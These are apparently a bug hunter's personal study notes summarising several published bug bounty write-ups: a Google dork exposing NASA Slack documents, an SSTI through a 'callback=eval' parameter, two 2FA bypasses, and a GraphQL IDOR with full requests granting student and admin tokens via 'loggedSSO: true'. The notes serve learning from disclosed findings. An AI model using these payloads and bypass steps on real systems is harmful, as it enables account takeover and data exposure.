*** Reading daily writeups and daily habit ***


----------------------------------------------------------------------------------------------------------------------------------------------------


 https://osintteam.blog/p3-medium-how-i-gain-access-to-nasas-internal-workspace-d0896fee563c

just use an google dork and found the internal slack pdf 
dork --> site:"*.nasa.gov" | "slack"
--> visiting that pdf it leads him to internal meetings records leaks of the NASA peoples 
--> Good p3 bug

--------------------------------------------------------------------------------------------------------------------------------------------------



https://medium.com/@ali.zamini/ssti-in-bug-bounty-program-the-time-i-played-with-handlebars-and-broke-stuff-7dc1f9834a3d

      1. Found a curious domain assume: mb.target.tld
      2. There was an search field as per IDs played with that
      3. Got a js file there that developer gave a hint like:
          3.1 Seems that result format/handling/etc has been changed
              I did some not too funny fixes to make it work here as well
              - onAlldevices - result data is string, eval it
              - onSingleDevice - without 'callback' response is lost somewhere
      4. Till now the user was searching like: ?id=123 by seeing callback and eval the user started like:
             4.1 ?id=123&callback=eval --> it does gives some result by reflecting eval like --> eval{id=123, "SOME_OTHER_INFO":"INFO"}} 
              4.2 Using anyother things instead of eval will also give us result but will not print anything on the page --> but the user input has been activated
      5. Now the user tweak the output to change the page hai...{k garako vanda ava kai request ma change garara output kasto auncha herna aatako}
           5.1 ?id=123&callback=eval({"Id":1,"Brand":"Alcatel", "SOME_OTHER_INFO":"Terrestrial"});// HTTP/1.1
           5.2 Great the page displayed --> "SOME_OTHER_INFO":"Terrestrial" --> so katai kai na kai ta vaye raxa it's good
      6. Now the user decided to do something like this, in the user controlled field he just do is: 4*4 
           6.1 ?id=123&callback=eval({"Id":1,"Brand":"Alcatel", "SOME_OTHER_INFO":"4*4"});//
           6.2 It shown 16 in the page ---> great SSTI found --> this is happens due to improper uses of eval function with handlebar template  
      7. This cause due to an using an eval and outdated can say template engine ---> always test like this don't forget Rabin ---> Always read the js files

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

 https://medium.com/@ultranoob/weird-and-simple-2fa-bypass-without-any-test-b869e09ac261

       1. The website has 2FA mechanism, enable it and start playing it.
       2. The 2fa was time based one time password 2FA.
           2.1  After every 30 sec the otp is been changing inside the Authenticator app
           2.2 Intresting, it has some backup codes in case the don't have access to the device.
       3. NOW BYPASS STORY, 
         3.1 Enable the 2FA after enabling it got backup code in case the user don't have access to the device totp.
         3.2 The backup codes are of 8 digit
         3.3 Now the user logged out and again check the application
         3.4  There was the option to login to the application with the backup codes
            3.4.1 The user clicked it and put the random 8 digit backup codes and hence it grant a access 
     4. Hence, this was the bug it didnot check the validation for the backup codes any 8 digit random code will work here.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
OCT - 20

https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3

  1. The website has the 2FA enable with the google Authenticator app.
  2. First tried in the login page, didnot success and move on to the forgot password page
  3. On Forget password page:
     3.1 Enter the Email-Id and click the Forget password and got the email
     3.2 The email looks like:  https://app.domain .io/reset/645hNr78tr5410HgG6yvYZtk2Y45lki7/
     3.3 The user visited the URL and enter the new password, and then the 2FA token was asked the user tried to bypass with response manipulation but it 
         didnot work too
 4. So the user visited the burp to see the request, to see what request is going with the 2fa
     4.1 It was a POST request with reset_key, email, csrf, password and token in the parameter
     4.2 Intresting, here token was the 2fa key
     4.3 So the user deleted the token parameter and it's value and then forward the request ---> boom the password has been changed.
5. The 2FA has been bypassed
6. So the main logic here was: 
    6.1 The 2fa key was in the token parameter deleting it and forwarding the request woudl give any valid user password should change.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


OCT- 20:

https://oussamarahali.com/blog/butterfly-effect-zero-click-account-takeover/

      ** The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover **
      1. The user mapped the application, and found out that it uses an GraphQL API.
      2. Initial discovery : GraphQL suggestion 
      3. IDOR Allowing Enumeration of Users:
          3.1 After initial discovery of the GraphQL, the user found an IDOR bug, that allowed to enumerate all the student and administrator of the platform
              through the student session. --> idor vetyo with multiple student and administrator with the student session.
          3.2 Enumerate student:
               3.2.1 POST /graphql
                     Host: foo.target.com
                     Authorization: Bearer [Student JWT]
                     Content-Type: application/json

                     {
                       "operationName": "student",
                       "variables": {},
                       "query": "query student {\n  student(id:1234) {\n    firstName\n    lastName\n    profile\n    affiliation\n    email\n    createdAt\n    __typename\n  }\n}"
                     }
                 3.2.2 Response:
                           HTTP/2 200 OK
                           [..]
                           
                           {
                             "data": {
                               "student": {
                                 "firstName": "Alan",
                                 "lastName": "Turing",
                                 "profile": "Employee",
                                 "affiliation": "foobar",
                                 "email": "alan.turing@student.tld",
                                 "createdAt": "2021-05-18T17:58:21.000Z",
                                 "__typename": "Student"
                               }
                             }
                           }
        3.3 Enumerate admin:
            POST /graphql
            Host: foo.target.com
            Authorization: Bearer [Student JWT]
            Content-Type: application/json
            
            {
              "operationName": "Administrator",
              "variables": {
                "id": "500"
              },
              "query": "query Administrator($id: ID!) {\n  administrator(id: $id) {\n    id\n    firstName\n    lastName\n    email\n    adminLevel\n    trainerId\n    affiliation\n    proprietaire\n    team\n    favoriteCourses\n     specificAccessStartDate\n    specificAccessEndDate\n    __typename\n  }\n}"
            }
            Response: 
                       HTTP/2 200 OK
                       [..]
                       
                       {
                         "data": {
                           "administrator": {
                             "id": "500",
                             "firstName": "Linus",
                             "lastName": "Torvalds",
                             "email": "linus.torvalds@admin.tld",
                             "adminLevel": 2,
                             "trainerId": "Linus_Torvalds",
                             "affiliation": "",
                             "proprietaire": null,
                             "team": null,
                             "favoriteCourses": null,
                             "specificAccessStartDate": null,
                             "specificAccessEndDate": null,
                             "__typename": "Administrator"
                           }
                         }
                       }
                                     


       4. From here now the user keep exploring the javascript file from here he finds that: How GraphQL’s Exclamation point ! Can Mislead: 
          When Required Fields Aren’t What They Seem
             4.1 there he found loggedinSSO , password, mutation LoginStudent
       5. So suprised here, giving the loggedinSSO: true will bypass the need of password --> loggedinSSO diyo vane password na dida in huncha it's bypaassed as per backend logic
             5.1 This vulnerability arise from the fact that while the GraphQL schema defined the password field as non-nullable, the backend logic did not enforce 
                 this constraint effectively. The presence of the loggedSSO flag bypassed the need for a password, leading to a critical authentication bypass.
       6. Request to bypass authentication for student account: 
                            POST /graphql
                        Host: foo.target.tld
                        Content-Type: application/json
                        
                        {
                          "operationName": "LoginStudent",
                          "variables": {
                            "email": "alan.turing@student.tld",
                            "password": "",             --> look password is null 
                            "loggedSSO": true                --> and this sets true , having this as true we don't need a password there
                          },
                          "query": "mutation LoginStudent($email: String, $uid: String, $password: String, $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginStudent(\n    email: $email\n    uid: $uid\n    password: $password\n    loggedSSO: $loggedSSO\n    dataToUpdate: $dataToUpdate\n  )\n}"
                        }
                
                 Response: 
               HTTP/2 200 OK
                [..]
                
                {
                  "data": {
                    "loginStudent": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwiZW1haWwiOiJhbGFuLnR1cmluZ0BzdHVkZW50LnRsZCIsImFmZmlsaWF0aW9uIjoidGFyZ2V0IiwiaWF0IjoxNzIxMjI2OTIwLCJleHAiOjE3MjkwMDI5MjB9.rCRntgXZmuqeaAv_l0w5SvTGiXnpTS62qiboaq-o5sc"
                  }
                }

                 6.1 So with this token the user has controlled over the student account ----> look just having student email with no password we can have any student details
      7.  Authentication Bypass: Admin - Leveraging GraphQL Suggestions for Admin Access: 
             7.1 Till now we can have any student details having only email of their, so the user thought that having admin email we can access it to right 
             7.2 He tried with admin email but the server return the session token OK, but using that token the user was not able to access the administrator feture.
     8. Now the error message comes in hady here : 
           8.1 OperationName : LoginAdmin --> this shows error in response like: Cannot query field “LoginAdmin” on type “Mutation”. Did you mean “loginAdmin” or “signupAdmin” ?)
           8.2 So we need to login as admin trying : loginAdmin will solve our problem
    9. POST /graphql
       Host: foo.target.tld
       Content-Type: application/json
       
       {
         "operationName": "loginAdmin",
         "variables": {
           "email": "linus.torvalds@admin.tld",
           "password": "",
           "loggedSSO": true
         },
         "query": "mutation loginAdmin($email: String, $uid: String, $password: String, $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginAdmin(\n    email: $email\n    uid: $uid\n    password: $password\n    loggedSSO: $loggedSSO\n    dataToUpdate: $dataToUpdate\n  )\n}"
       }
      RESPONSE: 
      HTTP/2 200 OK
        [..]
        
        {
          "data": {
            "loginAdmin": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwLCJlbWFpbCI6ImxpbnVzLnRvcnZhbGRzQGFkbWluLnRsZCIsImFkbWluTGV2ZWwiOjIsImlhdCI6MTcyMTMwMjMyNywiZXhwIjoxNzIzODk0MzI3fQ.xd-9Jf9OlBlWAc-H_DuU-WiK1dEj1UbYwCPnPWiT8Mk"
          }
        }
        
  10. Ok with this token the user have the full control as a admin too







































